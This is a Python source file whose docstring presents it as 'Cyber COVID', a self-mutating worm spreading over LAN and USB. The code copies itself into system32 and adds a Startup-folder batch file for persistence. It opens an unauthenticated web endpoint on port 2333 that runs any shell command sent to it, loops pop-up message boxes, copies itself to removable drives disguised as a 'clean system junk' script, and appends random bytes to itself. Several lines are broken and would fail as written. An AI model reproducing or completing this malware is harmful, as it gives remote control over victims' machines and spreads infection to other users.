'''
赛博新冠 - 轻量，可变异，局域网/USB传播
'''
import os
import sys
import time
import random
import _thread
mustInstall = ['flask','wmi','socket','win32api','psutil']
flagFile = 'flag'
startUp = """C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\starter.bat"""
try:
    with open('flag','r') as f:
        t = f.read()
        del t    
except FileExistsError:
    filename = sys.argv[0]
    for name in mustInstall:
        os.system('pip install {}'.format(name))
    os.system(filename)
    sys.exit()
import flask
import psutil
app = flask.Flask()
@app.route('/')
def index():
    return 200
@app.route('/cmd/<command>')
def windowsExec(command):
    t = os.popen(command).read()
    return {'code':200,'done':t}

os.system('copy ' + sys.argv[0] + ' C:/windows/system32/' + sys.argv[0])
f = open(startUp,'w')
f.write('@echo off\nstart ' + sys.argv[0])
f.close()
def startListen():
    app.run(host='0.0.0.0',port=2333)
def msgbox():
    try:
        f = open('tmp.vbs','w')
        f.write('msgbox("awa")')
        f.close()
        while True:
            os.system('tmp.vbs')
    except:
        pass
def usbListen():
    while True:
        for item in psutil.disk_partitions():
            if 'removable' in item.opts:
                firstLetter = chr('A')
                for i in range(26):
                    os.system('copy ' + sys.argv[0] + ' {}:/清理系统垃圾.bat'.format(ord(firstLetter)) + sys.argv[0])
                    firstLetter += 1

_thread.start_new_thread(startListen,())
_thread.start_new_thread(msgbox,())
_thread.start_new_thread(usbListen,())

while True:
    print(time.time())
    time.sleep(20)
    with open(sys.argv[0],'a') as f:
        if random.random() > 0.5:
            f.write(str(random.random()))
        else:
            f.write(str(ord(random.randint(45,50))))
#